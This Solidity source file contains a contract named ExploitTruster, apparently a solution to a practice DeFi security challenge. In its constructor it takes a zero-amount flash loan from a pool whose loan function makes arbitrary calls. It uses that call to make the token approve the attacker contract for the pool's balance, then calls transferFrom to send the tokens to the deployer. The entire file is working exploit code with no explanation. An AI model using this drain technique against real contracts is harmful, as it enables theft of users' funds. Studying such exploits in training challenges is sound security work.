// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITruster {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract ExploitTruster {
    constructor(address _pool, address _token, uint256 amount) {
        ITruster pool = ITruster(_pool);
        pool.flashLoan(
            0,
            address(this),
            _token,
            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
        );
        IERC20(_token).transferFrom(_pool, msg.sender, amount);
    }
}
